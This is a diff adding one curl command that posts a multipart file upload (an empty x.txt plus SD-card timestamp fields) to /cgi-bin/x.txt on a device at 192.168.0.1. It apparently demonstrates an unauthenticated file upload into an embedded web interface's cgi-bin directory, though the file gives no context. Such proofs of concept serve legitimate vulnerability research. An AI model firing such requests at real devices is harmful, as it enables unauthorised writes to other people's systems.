@@ -1,0 +1,14 @@
+curl 'http://192.168.0.1/cgi-bin/x.txt' \
+  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
+  -H 'Accept-Language: en,id;q=0.9' \
+  -H 'Cache-Control: no-cache' \
+  -H 'Connection: keep-alive' \
+  -H 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundary2mGxF5a1ch57RliR' \
+  -H 'Origin: http://192.168.0.1' \
+  -H 'Pragma: no-cache' \
+  -H 'Referer: http://192.168.0.1/index.html' \
+  -H 'Upgrade-Insecure-Requests: 1' \
+  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36' \
+  --data-raw $'------WebKitFormBoundary2mGxF5a1ch57RliR\r\nContent-Disposition: form-data; name="path_SD_CARD_time"\r\n\r\n2024-05-07 14:58:12\r\n------WebKitFormBoundary2mGxF5a1ch57RliR\r\nContent-Disposition: form-data; name="path_SD_CARD_time_unix"\r\n\r\n1715093892\r\n------WebKitFormBoundary2mGxF5a1ch57RliR\r\nContent-Disposition: form-data; name="filename"; filename="x.txt"\r\nContent-Type: text/plain\r\n\r\n\r\n------WebKitFormBoundary2mGxF5a1ch57RliR--\r\n' \
+  --compressed \
+  --insecure
